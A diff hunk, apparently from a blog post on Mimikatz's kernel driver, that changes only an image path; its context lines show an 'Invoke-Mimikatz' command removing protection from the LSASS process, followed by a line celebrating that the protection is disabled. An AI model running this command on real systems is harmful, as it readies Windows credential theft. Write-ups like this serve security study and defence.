@@ -46,7 +46,7 @@ Step 4: Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`"
 
 ```
 
-![](/images/2021-1-1-mimidrv/1.png)
+![](/images/2021-1-1-mimidrv/2.png)
 
 With the driver running combined with the above command, we have successfully disabled the protection !!
 
